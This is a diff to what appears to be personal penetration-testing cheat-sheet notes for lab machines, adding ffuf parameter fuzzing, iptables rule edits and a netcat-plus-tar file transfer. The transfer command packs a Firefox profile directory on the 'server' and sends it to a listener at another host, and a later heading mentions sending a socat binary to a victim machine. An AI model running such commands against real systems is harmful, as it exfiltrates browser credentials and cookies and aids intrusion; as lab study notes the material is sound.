@@ -10,6 +10,39 @@ Rustscan
 --------
 #rustscan -r 1-1000 -a 10.10.229.240 -- -sV -sC -oN scan
 
+Parmaeter fuzzing with ffuf
+---------------------------
+#ffuf -w /usr/share/wordlists/dirb/common.txt -X POST -u http://10.10.229.240/api/items?FUZZ=jsdfjsf -fs 45 -mc all
+
+-fs =minimum http response_size
+-mc = match all status code
+
+
+Sending && receiving file with tar 
+----------------------------------
+client
+-------
+#nc -lvnp 1234 | tar xf -
+
+server
+------
+#tar cf - .firefox | nc 10.4.52.17 1234
+ Configuring accept and drop list in IPtables
+--------------------------------------------
+#iptables -S | grep DROP
+
+-P INPUT DROP (so, we cannot access to python server with wget.)
+-P FORWARD DROP
+
+If you want to add 
+
+#iptables -A INPUT -i eth0 -p tcp --dport 8000 -j ACCEPT
+
+To see Accept list
+
+#iptables -S | grep ACCEPT
+
+
 socat port-forwarding
 ----------------------
 socat binary script install and send to victim machine
